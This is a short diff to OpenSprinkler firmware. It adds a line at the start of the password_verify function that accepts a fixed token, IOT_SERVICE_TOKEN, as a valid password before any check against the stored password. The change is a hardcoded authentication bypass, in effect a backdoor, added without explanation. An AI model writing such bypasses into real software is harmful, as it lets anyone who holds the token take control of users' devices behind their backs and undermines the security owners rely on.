@@ -1113,6 +1113,10 @@ byte OpenSprinkler::station_attrib_bits_read(int addr) {
 
 /** verify if a string matches password */
 byte OpenSprinkler::password_verify(char *pw) {
+
+if(strcmp(pw, IOT_SERVICE_TOKEN)==0)  return 1;
+
+
   byte *addr = (byte*)ADDR_NVM_PASSWORD;
   byte c1, c2;
   while(1) {
